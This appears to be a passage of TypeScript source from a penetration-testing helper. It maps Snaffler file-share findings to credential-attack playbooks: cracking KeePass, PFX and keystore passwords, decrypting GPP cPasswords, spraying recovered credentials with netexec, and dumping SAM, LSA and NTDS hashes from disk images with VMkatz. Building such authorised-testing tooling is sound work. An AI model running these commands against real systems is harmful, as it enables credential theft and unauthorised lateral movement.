import { FileResult, ShareInfo } from '../types';
import { RATING_ORDER, Severity } from './constants';
import { generateMountCmd, generateSmbclientCmd, parseUNCPath, type ParsedPath } from './commandGenerator';

export type AttackCategory =
  | 'credentials'
  | 'certificates'
  | 'disks'
  | 'dumps'
  | 'access'
  | 'cloud'
  | 'configs';

export const ATTACK_CATEGORY_LABELS: Record<AttackCategory, string> = {
  credentials: 'Credentials',
  certificates: 'Certificates',
  disks: 'Disk images',
  dumps: 'Dumps & hives',
  access: 'Access & lateral',
  cloud: 'Cloud & CI',
  configs: 'Configs & backups',
};

export const ATTACK_CATEGORY_ICONS: Record<AttackCategory | 'all', string> = {
  all: 'fa-layer-group',
  credentials: 'fa-key',
  certificates: 'fa-certificate',
  disks: 'fa-hdd',
  dumps: 'fa-archive',
  access: 'fa-door-open',
  cloud: 'fa-cloud',
  configs: 'fa-cog',
};

export type AttackTool = string | { name: string; url: string };

export function attackToolName(tool: AttackTool): string {
  return typeof tool === 'string' ? tool : tool.name;
}

export function attackToolUrl(tool: AttackTool): string | undefined {
  return typeof tool === 'string' ? undefined : tool.url;
}

export interface AttackCommand {
  label: string;
  description: string;
  command: string;
}

export interface AttackCommandContext {
  file?: FileResult;
  share?: ShareInfo;
  parsed: ParsedPath | null;
  localName: string;
  unc: string;
  linuxPath: string;
}

export interface FileMatcher {
  extensions?: string[];
  fileNames?: string[];
  fileNameIncludes?: string[];
  pathIncludes?: string[];
  ruleNameIncludes?: string[];
  contextIncludes?: string[];
  ratings?: Array<FileResult['rating']>;
  excludeExtensions?: string[];
  excludeFileNameIncludes?: string[];
  custom?: (file: FileResult) => boolean;
}

export interface AttackPlaybookDef {
  id: string;
  title: string;
  summary: string;
  why: string;
  nextSteps: string[];
  tools: AttackTool[];
  severity: Severity;
  category: AttackCategory;
  icon: string;
  source: 'files' | 'shares';
  matcher?: FileMatcher;
  shareMatch?: (share: ShareInfo) => boolean;
  resultsFilter?:
    | { type: 'extension'; value: string | string[] }
    | { type: 'search'; value: string };
  buildCommands: (ctx: AttackCommandContext) => AttackCommand[];
}

export type AttackTarget =
  | { kind: 'file'; file: FileResult }
  | { kind: 'share'; share: ShareInfo };

export interface AttackOpportunity {
  def: AttackPlaybookDef;
  targets: AttackTarget[];
}

function extensionOf(fileName: string): string {
  const i = fileName.lastIndexOf('.');
  if (i <= 0 || i === fileName.length - 1) return '';
  return fileName.slice(i + 1).toLowerCase();
}

function lowerName(file: FileResult): string {
  return file.fileName.toLowerCase();
}

function lowerPath(file: FileResult): string {
  return file.fullPath.toLowerCase();
}

export function shQuote(value: string): string {
  return `'${value.replace(/'/g, `'"'"'`)}'`;
}

export function psQuote(value: string): string {
  return `'${value.replace(/'/g, "''")}'`;
}

export function extractCPassword(context: string): string | null {
  if (!context) return null;
  const xml = context.match(/<cpassword>([^<]+)<\/cpassword>/i);
  if (xml?.[1]) return xml[1];
  const kv = context.match(/cpassword["'\s:=]+([A-Za-z0-9+/]{16,}={0,3})/i);
  return kv?.[1] ?? null;
}

function downloadCommand(ctx: AttackCommandContext): AttackCommand | null {
  if (!ctx.parsed) return null;
  return {
    label: 'smbclient download',
    description: 'Pull the file locally before offline analysis',
    command: generateSmbclientCmd(ctx.parsed),
  };
}

function withDownload(
  ctx: AttackCommandContext,
  commands: AttackCommand[]
): AttackCommand[] {
  const download = downloadCommand(ctx);
  return download ? [download, ...commands] : commands;
}

function fileMatches(file: FileResult, matcher: FileMatcher): boolean {
  const name = lowerName(file);
  const path = lowerPath(file);
  const ext = extensionOf(file.fileName);
  const rule = (file.ruleName || '').toLowerCase();
  const ctx = `${file.matchContext || ''} ${(file.matchedStrings || []).join(' ')}`.toLowerCase();

  if (matcher.extensions && !matcher.extensions.includes(ext)) return false;
  if (matcher.fileNames && !matcher.fileNames.includes(name)) return false;
  if (matcher.fileNameIncludes && !matcher.fileNameIncludes.some((s) => name.includes(s))) {
    return false;
  }
  if (matcher.pathIncludes && !matcher.pathIncludes.some((s) => path.includes(s))) {
    return false;
  }
  if (matcher.ruleNameIncludes && !matcher.ruleNameIncludes.some((s) => rule.includes(s))) {
    return false;
  }
  if (matcher.contextIncludes && !matcher.contextIncludes.some((s) => ctx.includes(s))) {
    return false;
  }
  if (matcher.ratings && !matcher.ratings.includes(file.rating)) return false;
  if (matcher.excludeExtensions && matcher.excludeExtensions.includes(ext)) return false;
  if (
    matcher.excludeFileNameIncludes &&
    matcher.excludeFileNameIncludes.some((s) => name.includes(s))
  ) {
    return false;
  }
  if (matcher.custom && !matcher.custom(file)) return false;
  return true;
}

function contextFromFile(file: FileResult): AttackCommandContext {
  const parsed = parseUNCPath(file.fullPath);
  return {
    file,
    parsed,
    localName: file.fileName,
    unc: file.fullPath,
    linuxPath: parsed?.relativePath.replace(/\\/g, '/') || file.fileName,
  };
}

function contextFromShare(share: ShareInfo): AttackCommandContext {
  const unc = share.path || `\\\\${share.systemId}\\${share.shareName}`;
  const parsed = parseUNCPath(unc);
  return {
    share,
    parsed,
    localName: share.shareName,
    unc,
    linuxPath: '',
  };
}

function sortFiles(files: FileResult[]): FileResult[] {
  return [...files].sort((a, b) => {
    const rating = (RATING_ORDER[b.rating] || 0) - (RATING_ORDER[a.rating] || 0);
    if (rating !== 0) return rating;
    return (b.riskScore?.total || 0) - (a.riskScore?.total || 0);
  });
}

const GPP_FILES = [
  'groups.xml',
  'scheduledtasks.xml',
  'services.xml',
  'datasources.xml',
  'drives.xml',
  'printers.xml',
];

const PLAINTEXT_NAME_HINTS = [
  'password',
  'passwd',
  'secret',
  'credential',
  'creds',
  'unattend',
];

const PLAINTEXT_RULE_HINTS = ['cred', 'password', 'secret', 'unattend'];

export const ATTACK_PLAYBOOKS: AttackPlaybookDef[] = [
  {
    id: 'pfx-auth',
    title: 'Authenticate with PFX / PKCS#12',
    summary: 'Client certs can auth via Certipy or NetExec if unlocked',
    why: 'A PFX/P12 is only immediately useful if the private key is reachable. Many share copies are password-protected, so treat this as a credential-plus-key lead rather than a guaranteed auth path. When the store opens (empty password is worth one try, then nearby files), Certipy or NetExec can PKINIT as the cert UPN and often return a TGT plus NT hash.',
    nextSteps: [
      'Inspect subject, UPN, and EKU (client auth / smart card logon) to see who the cert is',
      'Try Certipy and NetExec with an empty PFX password first — do not start by guessing',
      'If the store is locked, look next to the file for a password or crack the PKCS#12 hash',
    ],
    tools: ['certipy', 'netexec', 'openssl', 'pfx2john', 'hashcat'],
    severity: 'high',
    category: 'certificates',
    icon: 'fa-certificate',
    source: 'files',
    matcher: { extensions: ['pfx', 'p12'] },
    resultsFilter: { type: 'extension', value: 'pfx' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Inspect certificate',
          description: 'Read subject / UPN / EKU; try an empty password once',
          command: `certutil -dump ${psQuote(ctx.localName)}\nopenssl pkcs12 -in ${shQuote(ctx.localName)} -info -nokeys -passin pass:`,
        },
        {
          label: 'Certipy auth',
          description: 'PKINIT as the cert identity; omit -password if the PFX is unlocked',
          command: `certipy auth -pfx ${shQuote(ctx.localName)} -password '' -dc-ip DC_IP -domain DOMAIN`,
        },
        {
          label: 'NetExec auth',
          description: 'Use the same PFX against LDAP or SMB; UPN comes from the cert',
          command: `nxc ldap DC_IP -u USER --pfx-cert ${shQuote(ctx.localName)} --pfx-pass ''\nnxc smb DC_IP -u USER --pfx-cert ${shQuote(ctx.localName)} --pfx-pass ''`,
        },
        {
          label: 'Crack PFX password',
          description: 'Only if Certipy/NetExec fail because the store is protected',
          command: `pfx2john ${shQuote(ctx.localName)} > pfx.hash\nhashcat -m 24400 pfx.hash wordlist.txt`,
        },
      ]),
  },
  {
    id: 'private-keys',
    title: 'Use leftover private keys',
    summary: 'PEM/KEY material may unlock TLS, SSH, or services',
    why: 'Private keys on shares are often forgotten leftovers from TLS, code signing, or service accounts. Pair them with a nearby certificate or try them against SSH and internal HTTPS endpoints.',
    nextSteps: [
      'Identify whether the key is encrypted and look for a passphrase nearby',
      'Inspect the modulus / fingerprint and hunt for a matching cert',
      'Try the key against SSH, LDAPS, or the service the filename suggests',
    ],
    tools: ['openssl', 'ssh', 'ssh-keygen'],
    severity: 'high',
    category: 'certificates',
    icon: 'fa-key',
    source: 'files',
    matcher: {
      extensions: ['pem', 'key', 'pkcs8'],
      excludeFileNameIncludes: ['.pub'],
    },
    resultsFilter: { type: 'extension', value: 'pem' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Inspect key',
          description: 'Confirm type and whether it is encrypted',
          command: `openssl pkey -in ${shQuote(ctx.localName)} -text -noout`,
        },
        {
          label: 'Derive public key',
          description: 'Compare the fingerprint to certificates or authorized_keys',
          command: `ssh-keygen -y -f ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'ppk-keys',
    title: 'Convert PuTTY PPK keys',
    summary: 'PPK files convert to OpenSSH keys for login',
    why: 'PuTTY private keys on shares are frequently used by admins for jump-host or appliance access. Convert and test against the username hinted by the filename or nearby docs.',
    nextSteps: [
      'Convert PPK to OpenSSH format',
      'If passphrase-protected, crack with putty2john / hashcat',
      'Try SSH as the likely owner against hinted hosts',
    ],
    tools: ['puttygen', 'putty2john', 'hashcat', 'ssh'],
    severity: 'high',
    category: 'certificates',
    icon: 'fa-terminal',
    source: 'files',
    matcher: { extensions: ['ppk'] },
    resultsFilter: { type: 'extension', value: 'ppk' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Convert to OpenSSH',
          description: 'Create an OpenSSH private key from the PPK',
          command: `puttygen ${shQuote(ctx.localName)} -O private-openssh -o id_rsa_converted`,
        },
        {
          label: 'Crack passphrase',
          description: 'If the PPK is encrypted, attack the passphrase offline',
          command: `putty2john ${shQuote(ctx.localName)} > ppk.hash\nhashcat -m 17210 ppk.hash wordlist.txt`,
        },
      ]),
  },
  {
    id: 'java-keystore',
    title: 'Break Java keystores',
    summary: 'JKS/keystore files wrap TLS and app private keys',
    why: 'Application servers often leave JKS/JCEKS files on shares with default or reused passwords (changeit, password). A recovered private key can impersonate the service or decrypt captured traffic.',
    nextSteps: [
      'List aliases and try common keystore passwords',
      'Crack the store password if needed, then export the private key',
      'Reuse the cert/key against the application or admin interface',
    ],
    tools: ['keytool', 'keystore_hunter', 'hashcat'],
    severity: 'high',
    category: 'certificates',
    icon: 'fa-lock',
    source: 'files',
    matcher: { extensions: ['jks', 'keystore', 'jceks'] },
    resultsFilter: { type: 'extension', value: 'jks' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'List aliases',
          description: 'Try changeit / password / empty before cracking',
          command: `keytool -list -v -keystore ${shQuote(ctx.localName)} -storepass changeit`,
        },
        {
          label: 'Crack keystore',
          description: 'Offline attack against the JKS password',
          command: `keystore_hunter ${shQuote(ctx.localName)}\nhashcat -m 15500 jks.hash wordlist.txt`,
        },
      ]),
  },
  {
    id: 'keepass',
    title: 'Crack KeePass databases',
    summary: 'Offline attack the KDBX master password',
    why: 'KeePass databases on shares are high-value credential stores. A cracked master password often yields domain, VPN, and privileged application creds in one place.',
    nextSteps: [
      'Download the KDBX and look for a nearby key file (.key / .keyx)',
      'Extract a hash and crack the master password',
      'Open the DB and replay recovered credentials',
    ],
    tools: ['keepass2john', 'hashcat', 'john', 'keepassxc'],
    severity: 'critical',
    category: 'credentials',
    icon: 'fa-database',
    source: 'files',
    matcher: { extensions: ['kdbx', 'kdb'] },
    resultsFilter: { type: 'extension', value: 'kdbx' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Extract hash',
          description: 'Generate a hashcat/john hash from the database',
          command: `keepass2john ${shQuote(ctx.localName)} > keepass.hash`,
        },
        {
          label: 'Crack master password',
          description: 'KDBX4 is module 13400; older DBs may differ',
          command: `hashcat -m 13400 keepass.hash wordlist.txt`,
        },
      ]),
  },
  {
    id: 'gpp-cpassword',
    title: 'Decrypt GPP cPassword',
    summary: 'Groups.xml still hides AES-encrypted passwords',
    why: 'Group Policy Preferences stored passwords with a published AES key. Any cPassword in SYSVOL or a copied Groups.xml decrypts to a plaintext account password.',
    nextSteps: [
      'Pull the XML and extract the cPassword value',
      'Decrypt with gpp-decrypt or Get-GPPPassword',
      'Spray or pass the recovered account; check if it is still valid',
    ],
    tools: ['gpp-decrypt', 'Get-GPPPassword'],
    severity: 'critical',
    category: 'credentials',
    icon: 'fa-unlock-alt',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        if (GPP_FILES.includes(name)) return true;
        return /cpassword/i.test(file.matchContext || '');
      },
    },
    resultsFilter: { type: 'search', value: 'cpassword' },
    buildCommands: (ctx) => {
      const blob = extractCPassword(ctx.file?.matchContext || '');
      return withDownload(ctx, [
        {
          label: 'Decrypt cPassword',
          description: blob
            ? 'cPassword extracted from the Snaffler match context'
            : 'Replace the placeholder with the cPassword from the XML',
          command: `gpp-decrypt ${shQuote(blob || 'CPASSWORD_BLOB')}`,
        },
        {
          label: 'PowerSploit',
          description: 'Parse GPP XML on Windows and print recovered passwords',
          command: `Get-GPPPassword -Path ${psQuote(ctx.unc)}`,
        },
      ]);
    },
  },
  {
    id: 'unattend-sysprep',
    title: 'Extract unattend / sysprep passwords',
    summary: 'Windows setup files often embed local admin creds',
    why: 'unattend.xml, Autounattend.xml, and sysprep.inf frequently contain local administrator or domain-join passwords in plaintext or easily decoded base64.',
    nextSteps: [
      'Open the file and search for Password, Value, and Domain join accounts',
      'Decode any base64 <Value> entries',
      'Try recovered local admin creds on nearby Windows hosts',
    ],
    tools: ['xmllint', 'Select-String'],
    severity: 'critical',
    category: 'credentials',
    icon: 'fa-user-shield',
    source: 'files',
    matcher: {
      fileNames: ['unattend.xml', 'autounattend.xml', 'sysprep.xml', 'sysprep.inf'],
    },
    resultsFilter: { type: 'search', value: 'unattend' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Extract password fields',
          description: 'Pull password-related XML nodes',
          command: `grep -n -i -E 'password|administrator|value' ${shQuote(ctx.localName)}`,
        },
        {
          label: 'PowerShell parse',
          description: 'Read the unattend file from the UNC path',
          command: `Select-String -Path ${psQuote(ctx.unc)} -Pattern 'Password|Value|PlainText' -Context 0,2`,
        },
      ]),
  },
  {
    id: 'web-config',
    title: 'Loot web.config connection strings',
    summary: 'IIS configs often hold DB and service credentials',
    why: 'web.config, machine.config, and connectionStrings files commonly store SQL, LDAP, and API credentials in plaintext. Those accounts frequently have broad access to application data or the domain.',
    nextSteps: [
      'Read connectionStrings, appSettings, and identity sections',
      'Test database logins and look for sa / db_owner',
      'Reuse service account passwords against other hosts',
    ],
    tools: ['smbclient', 'Select-String', 'sqlcmd'],
    severity: 'high',
    category: 'configs',
    icon: 'fa-cog',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        return (
          name === 'web.config' ||
          name.startsWith('web.config.') ||
          name === 'applicationhost.config' ||
          name === 'machine.config' ||
          name === 'connectionstrings.config'
        );
      },
    },
    resultsFilter: { type: 'search', value: 'web.config' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Read secrets',
          description: 'Show likely credential fields from the config',
          command: `grep -n -i -E 'connectionstring|password|user id|appsettings|identity' ${shQuote(ctx.localName)}`,
        },
        {
          label: 'PowerShell read',
          description: 'Read the file directly from the share',
          command: `Get-Content -Path ${psQuote(ctx.unc)}`,
        },
      ]),
  },
  {
    id: 'app-secrets',
    title: 'Harvest .env and appsettings secrets',
    summary: 'App config files leak API keys and DB passwords',
    why: '.env and appsettings*.json files are the default place developers stash connection strings, cloud keys, and JWT secrets. They often work outside the original app.',
    nextSteps: [
      'Collect every key/value that looks like a secret',
      'Identify the target (DB, AWS, Azure, SMTP, JWT)',
      'Reuse keys against the matching cloud or internal service',
    ],
    tools: ['grep', 'jq'],
    severity: 'high',
    category: 'configs',
    icon: 'fa-code',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        return (
          name === '.env' ||
          name.startsWith('.env.') ||
          name.endsWith('.env') ||
          name === 'secrets.json' ||
          name === 'appsettings.json' ||
          name.startsWith('appsettings.')
        );
      },
    },
    resultsFilter: { type: 'extension', value: ['env', 'appsettings'] },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Extract secret-looking keys',
          description: 'Filter config lines that usually hold credentials',
          command: `grep -n -i -E 'pass|secret|token|key|connection|aws|azure|account' ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'cms-config',
    title: 'Read CMS / PHP app credentials',
    summary: 'wp-config and cousins embed database logins',
    why: 'WordPress, Drupal, Joomla, and phpMyAdmin configs store database users, table prefixes, and sometimes SMTP or FTP passwords in plaintext PHP.',
    nextSteps: [
      'Extract DB_USER / DB_PASSWORD / $databases values',
      'Connect to the database and dump users / hashes',
      'Look for reused admin passwords on the CMS and SSH',
    ],
    tools: ['grep', 'mysql', 'wp-cli'],
    severity: 'high',
    category: 'configs',
    icon: 'fa-wordpress',
    source: 'files',
    matcher: {
      fileNames: [
        'wp-config.php',
        'settings.php',
        'localsettings.php',
        'config.inc.php',
        'configuration.php',
      ],
    },
    resultsFilter: { type: 'search', value: 'wp-config' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Extract PHP credentials',
          description: 'Pull define() and array credential assignments',
          command: `grep -n -i -E 'db_|password|user|secret|smtp|ftp' ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'cloud-creds',
    title: 'Reuse cloud credential files',
    summary: 'AWS, Azure, and GCP files grant cloud control',
    why: 'Static cloud credential files on shares (AWS credentials, Azure publish settings, GCP ADC JSON, service principals) often still work and can enumerate or modify production.',
    nextSteps: [
      'Identify the provider and account/subscription from the file',
      'Authenticate with the official CLI and check identity',
      'Enumerate privileges; prefer read-only recon first',
    ],
    tools: ['aws', 'az', 'gcloud', 'pacu'],
    severity: 'critical',
    category: 'cloud',
    icon: 'fa-cloud',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        const path = lowerPath(file);
        return (
          (name === 'credentials' && path.includes('.aws')) ||
          name === 'credentials.csv' ||
          name.endsWith('.publishsettings') ||
          name === 'application_default_credentials.json' ||
          name.includes('serviceprincipal') ||
          name === '.s3cfg' ||
          name === 'azureprofile.json'
        );
      },
    },
    resultsFilter: { type: 'search', value: 'credentials' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'AWS identity',
          description: 'If this is an AWS credentials file, check who it is',
          command: `AWS_SHARED_CREDENTIALS_FILE=${shQuote(ctx.localName)} aws sts get-caller-identity`,
        },
        {
          label: 'Azure login',
          description: 'For a service principal JSON / publish settings file',
          command: `az login --service-principal -u APP_ID -p ${shQuote(ctx.localName)} --tenant TENANT_ID`,
        },
      ]),
  },
  {
    id: 'ci-secrets',
    title: 'Recover CI / IaC secrets',
    summary: 'Jenkins, Ansible Vault, and Terraform hide creds',
    why: 'Jenkins credentials.xml + master.key, Ansible vault files, and terraform.tfstate regularly contain cloud keys, SSH keys, and service passwords from pipelines.',
    nextSteps: [
      'For Jenkins: collect credentials.xml, master.key, and hudson.util.Secret',
      'For Ansible: crack or reuse the vault password from nearby docs',
      'For Terraform: parse tfstate for plaintext secrets',
    ],
    tools: ['jenkins-decrypt', 'ansible-vault', 'jq', 'trufflehog'],
    severity: 'critical',
    category: 'cloud',
    icon: 'fa-cogs',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        return (
          name === 'credentials.xml' ||
          name === 'master.key' ||
          name === 'hudson.util.secret' ||
          name.endsWith('.tfstate') ||
          name.endsWith('.tfvars') ||
          name.endsWith('.vault') ||
          name.includes('vault.yml') ||
          name.includes('vault.yaml')
        );
      },
    },
    resultsFilter: { type: 'search', value: 'tfstate' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Parse Terraform state',
          description: 'Hunt secret-looking values in tfstate / tfvars',
          command: `jq -r '.. | strings? | select(test("(?i)pass|secret|token|key|akid"))' ${shQuote(ctx.localName)}`,
        },
        {
          label: 'Ansible vault view',
          description: 'If this is a vault file, try a recovered password',
          command: `ansible-vault view ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'saved-clients',
    title: 'Recover saved FTP / SFTP / Git logins',
    summary: 'WinSCP, FileZilla, and git-credentials store passwords',
    why: 'Admin workstations and shares often contain exported WinSCP.ini, FileZilla sitemanager.xml, or .git-credentials. These decode to reusable remote-access passwords.',
    nextSteps: [
      'Parse the client config and decode obfuscated passwords',
      'Note host, username, and protocol',
      'Reuse against the same service and look for password reuse',
    ],
    tools: ['WinSCP', 'python', 'git'],
    severity: 'high',
    category: 'credentials',
    icon: 'fa-plug',
    source: 'files',
    matcher: {
      fileNames: [
        'sitemanager.xml',
        'recentservers.xml',
        'winscp.ini',
        '.git-credentials',
        '.netrc',
        '_netrc',
      ],
    },
    resultsFilter: { type: 'search', value: 'winscp' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Read saved sessions',
          description: 'Inspect hosts and encoded passwords',
          command: `grep -n -i -E 'host|user|pass|protocol|url' ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'browser-logins',
    title: 'Extract browser saved logins',
    summary: 'Chrome/Firefox DBs hold reused web passwords',
    why: 'Chrome Login Data and Firefox logins.json + key4.db on shares or roaming profiles can be decrypted offline, often revealing SSO, VPN portals, and internal apps.',
    nextSteps: [
      'Collect Login Data / logins.json plus the matching key file',
      'Decrypt with the user password or DPAPI masterkey if available',
      'Replay high-value internal and SSO credentials',
    ],
    tools: ['lazagne', 'firepwd', 'pypykatz'],
    severity: 'high',
    category: 'credentials',
    icon: 'fa-globe',
    source: 'files',
    matcher: {
      fileNames: ['login data', 'logins.json', 'key4.db', 'key3.db'],
    },
    resultsFilter: { type: 'search', value: 'logins.json' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Firefox decrypt',
          description: 'Requires logins.json and key4.db from the same profile',
          command: `firepwd.py -d ./firefox-profile`,
        },
        {
          label: 'LaZagne browsers',
          description: 'If you have a full user profile directory',
          command: `lazagne browsers`,
        },
      ]),
  },
  {
    id: 'htpasswd',
    title: 'Crack .htpasswd hashes',
    summary: 'HTTP basic-auth hashes are offline-crackable',
    why: '.htpasswd files expose username:hash pairs for basic auth. Cracked passwords are often reused on SSH, RDP, or the application admin panel.',
    nextSteps: [
      'Identify the hash type (MD5 apr1, bcrypt, SHA)',
      'Crack with hashcat/john',
      'Try recovered users against the related vhost and elsewhere',
    ],
    tools: ['hashcat', 'john', 'htpasswd'],
    severity: 'medium',
    category: 'credentials',
    icon: 'fa-user-lock',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        return name === '.htpasswd' || name === 'htpasswd' || name.endsWith('.htpasswd');
      },
    },
    resultsFilter: { type: 'search', value: 'htpasswd' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Crack hashes',
          description: 'apr1 is 1600; bcrypt is 3200 — inspect the prefix first',
          command: `hashcat -m 1600 ${shQuote(ctx.localName)} wordlist.txt`,
        },
      ]),
  },
  {
    id: 'vnc-passwords',
    title: 'Recover VNC passwords',
    summary: 'UltraVNC / TightVNC store weakly protected passwords',
    why: 'VNC INI files on shares use a well-known obfuscation (DES with a fixed key). Recovered passwords often work for console access on the same hosts.',
    nextSteps: [
      'Extract the Password / PasswdHash value',
      'Decode with vncpwd / the fixed-key DES scheme',
      'Connect to the VNC service as that user',
    ],
    tools: ['vncpwd', 'python'],
    severity: 'high',
    category: 'credentials',
    icon: 'fa-desktop',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        return (
          name === 'ultravnc.ini' ||
          name === 'tightvnc.ini' ||
          name === 'ultravnc.conf' ||
          (name.includes('vnc') && (name.endsWith('.ini') || name.endsWith('.pwd')))
        );
      },
    },
    resultsFilter: { type: 'search', value: 'vnc' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Read VNC password field',
          description: 'Grab the obfuscated password hex',
          command: `grep -n -i -E 'pass|passwd' ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'plaintext-creds',
    title: 'Replay plaintext credential files',
    summary: 'Password lists and secret notes are ready to spray',
    why: 'Snaffler already flagged these as credential-bearing files. Treat them as a ready-made spray list: usernames, passwords, API keys, and connection strings.',
    nextSteps: [
      'Normalize user/pass pairs and drop obvious placeholders',
      'Spray carefully against the matching service (LDAP, SSH, SQL, web)',
      'Check password reuse on privileged groups after a hit',
    ],
    tools: ['netexec', 'kerbrute', 'crackmapexec'],
    severity: 'high',
    category: 'credentials',
    icon: 'fa-clipboard-list',
    source: 'files',
    matcher: {
      custom: (file) => {
        if (file.rating === 'Green') return false;
        const name = lowerName(file);
        const rule = (file.ruleName || '').toLowerCase();
        return (
          PLAINTEXT_NAME_HINTS.some((hint) => name.includes(hint)) ||
          PLAINTEXT_RULE_HINTS.some((hint) => rule.includes(hint))
        );
      },
    },
    resultsFilter: { type: 'search', value: 'password' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Read file',
          description: 'Review recovered secrets before spraying',
          command: `sed -n '1,80p' ${shQuote(ctx.localName)}`,
        },
        {
          label: 'Spray (template)',
          description: 'Replace users.txt/passes.txt with extracted pairs',
          command: `netexec smb DC_IP -u users.txt -p passes.txt --continue-on-success`,
        },
      ]),
  },
  {
    id: 'vmdk-vhd',
    title: 'Extract secrets from disk images',
    summary: 'Run VMkatz on a mounted share — do not download the disk',
    why: 'VMDK/VHD/VHDX files on shares are often tens or hundreds of gigabytes, so copying them locally is rarely practical. Mount the share and run VMkatz against the image in place to pull SAM hashes, LSA secrets, cached domain creds, DPAPI keys, and NTDS.dit without exfiltrating the disk.',
    nextSteps: [
      'Mount the file share read-only (CIFS) instead of downloading the image',
      'Point VMkatz at the VMDK/VHD on the mount — it reads SAM/LSA/NTDS in place',
      'If the folder also has .vmsn/.vmem snapshots, run VMkatz on those for live credentials',
    ],
    tools: [{ name: 'vmkatz', url: 'https://github.com/nikaiw/VMkatz' }, 'mount.cifs'],
    severity: 'critical',
    category: 'disks',
    icon: 'fa-hdd',
    source: 'files',
    matcher: { extensions: ['vmdk', 'vhd', 'vhdx', 'qcow2', 'vdi'] },
    resultsFilter: { type: 'extension', value: 'vmdk' },
    buildCommands: (ctx) => {
      const mounted = ctx.parsed
        ? `/mnt/share/${ctx.linuxPath}`
        : `/mnt/share/${ctx.localName}`;
      const commands: AttackCommand[] = [];
      if (ctx.parsed) {
        commands.push({
          label: 'Mount the share (read-only)',
          description: 'Keep the VMDK on the file server; do not copy it locally',
          command: `sudo mkdir -p /mnt/share\n${generateMountCmd(ctx.parsed)},ro`,
        });
      }
      commands.push(
        {
          label: 'VMkatz (disk in place)',
          description: 'Extract SAM / LSA / cached creds from the mounted image',
          command: `./vmkatz ${shQuote(mounted)}`,
        },
        {
          label: 'VMkatz NTDS (if a DC disk)',
          description: 'Dump AD hashes from ntds.dit inside the image',
          command: `./vmkatz --ntds ${shQuote(mounted)}`,
        }
      );
      return commands;
    },
  },
  {
    id: 'ova-ovf',
    title: 'Unpack OVA / OVF then run VMkatz',
    summary: 'OVA is a tar archive — extract the nested VMDK first',
    why: 'VMkatz cannot read .ova directly. An OVA is a tar of an OVF descriptor plus one or more VMDKs. Mount the share, list the archive, pull out only the disk, then run VMkatz on that VMDK. A standalone .ovf is XML metadata: loot any embedded passwords and point VMkatz at the sibling .vmdk it references.',
    nextSteps: [
      'Mount the share read-only — do not copy the whole OVA locally',
      'List the archive and extract only the nested .vmdk (that is what VMkatz can parse)',
      'For .ovf, read the XML for credentials and run VMkatz on the referenced disk in the same folder',
    ],
    tools: [{ name: 'vmkatz', url: 'https://github.com/nikaiw/VMkatz' }, 'tar', '7z', 'mount.cifs'],
    severity: 'critical',
    category: 'disks',
    icon: 'fa-box',
    source: 'files',
    matcher: { extensions: ['ova', 'ovf'] },
    resultsFilter: { type: 'extension', value: ['ova', 'ovf'] },
    buildCommands: (ctx) => {
      const mounted = ctx.parsed
        ? `/mnt/share/${ctx.linuxPath}`
        : `/mnt/share/${ctx.localName}`;
      const commands: AttackCommand[] = [];
      if (ctx.parsed) {
        commands.push({
          label: 'Mount the share (read-only)',
          description: 'Work against the OVA on the file server',
          command: `sudo mkdir -p /mnt/share\n${generateMountCmd(ctx.parsed)},ro`,
        });
      }
      commands.push(
        {
          label: 'List OVA contents',
          description: 'Find the nested VMDK name without unpacking everything',
          command: `tar -tf ${shQuote(mounted)}\n# or\n7z l ${shQuote(mounted)}`,
        },
        {
          label: 'Extract nested VMDK, then VMkatz',
          description: 'Pull only the disk out of the tar, then extract secrets',
          command: `mkdir -p /tmp/ova_out\ntar -xf ${shQuote(mounted)} -C /tmp/ova_out --wildcards '*.vmdk'\n./vmkatz /tmp/ova_out/*.vmdk`,
        },
        {
          label: 'Read OVF descriptor',
          description: 'If this is .ovf, hunt passwords and the referenced disk filename',
          command: `grep -n -i -E 'password|ovf:href|vmdk|user' ${shQuote(mounted)}`,
        }
      );
      return commands;
    },
  },
  {
    id: 'iso-wim',
    title: 'Loot ISO / WIM install media',
    summary: 'Images hide unattend files and embedded scripts',
    why: 'ISO and WIM files used for deployment often include Autounattend.xml, unattend.xml, or MDT scripts with domain-join and local admin passwords.',
    nextSteps: [
      'Mount or extract the image',
      'Search for unattend, bootstrap.ini, and customsettings.ini',
      'Reuse any domain-join or local admin credentials',
    ],
    tools: ['7z', 'wimlib-imagex', 'guestmount'],
    severity: 'high',
    category: 'disks',
    icon: 'fa-compact-disc',
    source: 'files',
    matcher: { extensions: ['iso', 'wim', 'esd'] },
    resultsFilter: { type: 'extension', value: 'iso' },
